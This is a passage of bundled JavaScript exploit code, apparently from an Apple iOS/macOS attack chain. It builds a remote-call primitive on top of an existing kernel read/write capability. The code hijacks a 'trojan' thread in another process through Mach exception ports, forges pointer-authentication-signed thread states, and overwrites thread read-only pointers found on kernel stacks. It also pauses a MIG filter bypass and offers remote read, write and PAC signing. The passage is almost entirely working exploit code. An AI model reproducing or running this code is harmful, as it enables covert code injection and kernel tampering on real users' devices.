			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;	
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
			this.#dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
			this.#dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(this.#dummyThreadMach);
			this.#dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(this.#dummyThreadAddr);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep",1n);
			if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
			{
				if (migFilterBypass)
					migFilterBypass.pause();
				this.destroy();
				return null;
			}
		}

		if (migFilterBypass)
			migFilterBypass.pause();
		
		console.log(TAG,`All good so far! Now we resume trojan thread...`);

		ret = this.#doRemoteCallTemp(100, "thread_resume", callThreadPort);
		if (ret !== 0n)
		{
			console.log(TAG,`Couldn't resume newly created thread, falling back to use original one only`);
			this.#creatingExtraThread = false;
		}

		if (this.#creatingExtraThread)
		{
			console.log(TAG,`New thread created succesfully, resuming original`);
			this.#restoreTrojanThread(this.#originalState);
		}
		console.log(TAG, `Original thread restored succesfully`);

		this.#pid = this.#doRemoteCallStable(100, "getpid");
		console.log(TAG, `Task pid: ${this.#pid}`);
		
		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
		
		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);

		this.#success = true;

		console.log(TAG,`Finished for now succesfully`);
	}
	success() {
		return this.#success;
	}

	krwCtx() {
		return {
			controlFd: this.#krwControlFd,
			rwFd: this.#krwRwFd
		};
	}

	pid() {
		return this.#pid;
	}

	#testRWPrim()
	{
		console.log(TAG,`Testing RW prim`);
		let arr = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let arrView = new DataView(arr);
		arrView.setBigUint64(0,0x41414141n,true);
		let memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(memBuff,arr);
		this.write(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		this.read(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		let resBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(memBuff,libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let resView = new DataView(resBuff);
		let result = resView.getBigUint64(0,true);
		console.log(TAG,`Got result from Buffer of:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(result)}`);
	}

	#retryFirstThread(migFilterBypass) {
		if (migFilterBypass)
			migFilterBypass.pause();
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", 1n);
		if (migFilterBypass)
			migFilterBypass.resume();
		return _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
	}

	#signState(SigningThread,state,pc,lr)
	{
		//console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
		let diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
		//console.log(TAG,`diver after:${Utils.hex(diver)}`);
		let discPC = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("pc"));
		let discLR = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("lr"));
		//console.log(TAG,`discPC:${Utils.hex(discPC)}`);
		//console.log(TAG,`discLR:${Utils.hex(discLR)}`);
		/* C wrapper for ptrauth utils
		discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
		discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
		console.log(TAG,`discPC after:${Utils.hex(discPC)}`);
		console.log(TAG,`discLR after:${Utils.hex(discLR)}`);
		*/
		if (pc)
		{
			state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
			state.opaque_pc = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, pc, discPC);
		}
		if (lr)
		{
			state.opaque_flags &= ~(
				__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
				__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
			state.opaque_lr = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, lr, discLR);
		}
		return state;
	}
	
	#setExceptionPortOnThread(exceptionPort, currThread, migFilterBypass=null)
	{
		let success = false;
		
		let thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
		let pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");

		//console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
		//console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
		//console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));

		//let stackMem = Native.callSymbol("malloc", 0x8000);
		//let thread_set_exception_ports_addr = Native.dlsym("_exit");
		//let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		//let state = new ThreadState(stateBuff);

		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
		
		let pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
		let pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
		//console.log(TAG, "pthread: " + Utils.hex(pthread));

		let machThread = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", pthread));
		let machThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(machThread);
		//console.log(TAG, `machThread:${Utils.hex(machThread)} machThreadAddr:${Utils.hex(machThreadAddr)}`);

		if (migFilterBypass)
			migFilterBypass.monitorThreads(this.#selfThreadAddr, machThreadAddr);

		let state = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getState(machThread);
		if (!state) {
			console.log(TAG, "Unable to read thread state");
			return false;
		}

		//console.log(TAG, "thread_get_state OK");

		state.opaque_pc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(thread_set_exception_ports_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("pc"));
		state.opaque_lr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(pthread_exit_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("lr"));
		//state.opaque_sp = stackMem + 0x4000n;
		state.registers.set(0, this.#dummyThreadMach);
		state.registers.set(1, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_GUARD | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_BAD_ACCESS);
		state.registers.set(2, exceptionPort);
		state.registers.set(3, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES);
		state.registers.set(4, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64);

		//console.log(TAG, "pc: " + Utils.hex(state.opaque_pc));
		//console.log(TAG, "lr: " + Utils.hex(state.opaque_lr));
		//console.log(TAG, "sp: " + Utils.hex(state.opaque_sp));
		//console.log(TAG, "x0: " + Utils.hex(state.registers.get(0)));
		//console.log(TAG, "x1: " + Utils.hex(state.registers.get(1)));
		//console.log(TAG, "x2: " + Utils.hex(state.registers.get(2)));
		//console.log(TAG, "x3: " + Utils.hex(state.registers.get(3)));
		//console.log(TAG, "x4: " + Utils.hex(state.registers.get(4)));

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
	
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state))
			return false;

		//console.log(TAG, "Thread.setState() OK");

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, this.#selfThreadCtid);
		
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread))
			return false;

		//console.log(TAG, "Thread resume OK");

		/*
		let threadmem = Native.callSymbol("malloc",0x400);
		Native.write64(threadmem + 0x100n, this.#dummyThreadMach);
		Native.write64(threadmem + 0x108n, exceptionPort);
		Native.callSymbol("usleep",100n);
		Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
		let timeout = 10000n;
		if(largeTimeout)
			timeout = 30000n;
		Native.callSymbol("usleep",timeout);
		let machThread = Native.read64(threadmem + 0x100n);
		Native.callSymbol("free",threadmem);
		let machThreadAddr = 0n;
		if(machThread == this.#dummyThreadMach)
		{
			console.log(TAG,`remote thread didn't succeed, aborting`);
			Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			// This will wake up setter
			Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			return false;
		}
		else
			machThreadAddr = Task.getPortKObject(machThread);
		*/

		//Native.callSymbol("usleep",100n);
		//kr = Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//console.log(TAG, "thread_switch: " + kr);
		//if (!machThreadAddr)
		//{
		//	console.log(TAG,`Unable to get machThreadAddr`);
			//return false;
		//}
		//console.log(TAG, "Successfully switched to new mach thread");

		//Native.callSymbol("sleep", 2);
		//Native.callSymbol("usleep", 100000);

		//Native.callSymbol("sleep", 1);

		for (let i=0; i<10; i++) {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 200000);

			let kstack = 0x0n;
			//let retries = 0n;
			//while (true && !kstack && retries < 100000n)
			//{
			//	//Native.callSymbol("usleep",100n);
			//	kstack = Thread.getStack(machThreadAddr);
			//	retries++;
			//}
			kstack = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getStack(machThreadAddr);
			if (!kstack)
			{
				console.log(TAG,`Failed to get kstack. Retry...`);
				continue;
			}
			//console.log(TAG,`kstack:${Utils.hex(kstack)}`);
			// Waiting a bit longer to make sure pointer is valid
			//Native.callSymbol("usleep",10000n);
			//console.log(TAG,`Current mutex:${Utils.hex(Thread.getMutex(this.#dummyThreadAddr))}`);
			//uwrite64(threadmem + 0x100n,0x0n); // instead of free
			let kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE * 12);
			let kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(kstack + kernelSPOffset);
			if (!kernelSP) {
				console.log(TAG, "Failed to get SP. Retry...");
				continue;
			}
			//console.log(TAG,`kernelSP:${Utils.hex(kernelSP)}`);
			//Native.callSymbol("usleep",20000n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",100n);
			//let data = Native.callSymbol("malloc",0x1000n);
			//console.log(TAG,`Before reading from page`);
			let dataBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].readBuff(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + 0x3000n, 0x1000);
			if (!dataBuff) {
				console.log(TAG, "Failed to read from kernel SP. Aborting...");
				break;
			}
			//console.log(TAG,`Second read finished succesfully`);
			//Native.callSymbol("usleep",100n);
			//let dataBuff = Native.read(data,0x1000);
			//Native.callSymbol("free",data);

			//let troPointer = Native.mem;
			let buffer = new ArrayBuffer(8);
			const view = new DataView(buffer);
			view.setBigUint64(0,this.#dummyThreadTro,true);
			let found = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].memmem(dataBuff,buffer);
			//console.log(TAG,`found:${Utils.hex(found)}`);
			found = BigInt(found) + 0x3000n;
			let correctTro = false;
			let val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + found + 0x18n, val, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
			val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readPtr(val);
			if(val == 0x1002)
				correctTro = true;
			else {
				console.log(TAG, "Wrong tro. Retry...");
				continue;
			}
				//console.log(TAG,`Wrong tro, skipping this thread`);
			if (found && correctTro)
			{
				//console.log(TAG,`Found TRO!`);
				if(_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread) == this.#taskAddr)
				{
					let tro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(currThread);
					//console.log(TAG,`tro:${Utils.hex(tro)}`);
					libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write64(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + BigInt(found), tro);
					success = true;
					break;
				}
				else
				{
					console.log(TAG,`got empty tro, skip writing`);
				}
			}
			else
			{
				console.log(TAG, `didnt find tro for ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)}`);
			}
		}

		//console.log(TAG,`Injecting into:${Utils.hex(currThread)}`);
		// Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP

		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		// This will wake up setter
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, exceptionPort , libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64));
		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//Native.callSymbol("usleep",40000n);
		//console.log(TAG,`After second thread switch`);
		//pthread_join(setExceptionThread, NULL);
		//mpd_js_thread_join(th);
		//free(data);
		//console.log(TAG,`Finish injecting into:${Utils.hex(currThread)}`);

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		return success;
	}

	#doRemoteCallTemp(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on original thread`);
			return 0n;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		this._lastLiveSP = exc.threadState.opaque_sp & 0x7fffffffffn;
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojanCreator);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0,x0);
	
		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0n;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on original thread`);
			return 0n;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	#doRemoteCallStable(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		if (!this.#creatingExtraThread)
			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
			
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		if (!pcAddr) {
			console.log(TAG, "Unable to find symbol: " + name);
			return 0n;
		}
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on new thread`);
			return 0n;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		this._lastLiveSP = exc.threadState.opaque_sp & 0x7fffffffffn;
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojan);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0, x0);

		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0n;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on new thread`);
			return 0n;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	call(
		timeout,
		pc,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		//console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
		return this.#doRemoteCallStable(timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
	}

	#restoreTrojanThread(state)
	{
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, 20000, false))
		{
			console.log(TAG,`Failed to receive first exception while restoring`);
			return false;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		state.opaque_flags = exc.threadState.opaque_flags;
		state = this.#signState(this.#trojanThreadAddr, state,state.opaque_pc,state.opaque_lr);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, state, false);
		return true;
	}

	destroy()
	{
		try {
			for (let i = 0; i < this.#threadList.length; i++)
				_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
		} catch (_) {}
		if (this.#success) {
			try {
				this.#doRemoteCallStable(100, "munmap", this.#trojanMem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
			} catch (_) {}
			try {
				if (this.#creatingExtraThread)
					this.#doRemoteCallStable(-1, "pthread_exit");
				else
					this.#restoreTrojanThread(this.#originalState);
			} catch (_) {}
		}
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#firstExceptionPort, 0n, 0n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#secondExceptionPort, 0n, 0n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_cancel", this.#dummyThread);
		} catch (_) {}
	}

	read(src, dst, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		//console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
		let until = src + size;
		while (src < until)
		{
			size = until - src;
			let offs = src & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount =  libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(src + 1n) - src, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(src);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "read() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
	
			src += copyCount;
			dst += copyCount;
		}
		return true;
	}

	write(dst, src, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		let until = dst + size;

		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
	
		while (dst < until)
		{
			size = until - dst;
			let offs = dst & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(dst + 1n) - dst, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(dst);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				console.log(TAG, "write() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
	
			dst += copyCount;
			src += copyCount;
		}
		return true;	
	}

	writeStr(dst, str)
	{
		if (!str)
			return false;
		//return this.write(dst, Native.getCString(str), str.length + 1);
		let mem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("malloc", str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(mem, str);
		const ret = this.write(dst, mem, str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("free", mem);
		return ret;
	}

	read64(src)
	{
		if (!this.read(src, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE))
			return false;
		const buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	write64(dst, val)
	{
		const buff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		view.setBigUint64(0, val, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, buff);
		return this.write(dst, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
	}

	mem()
	{
		return this.#trojanMem;
	}

	lastLiveSP()
	{
		return this._lastLiveSP || 0n;
	}

	pac(address,modifier)
	{
		return _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, address, modifier);
	}

	insertRight(port, right)
	{
		//console.log(TAG, "Insert right: " + Utils.hex(port));

		const MACH_MSG_TYPE_COPY_SEND = 19;

		let msgBuff = new ArrayBuffer(24);
		let msg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](msgBuff);
		msg.msgh_id = 0x4141;
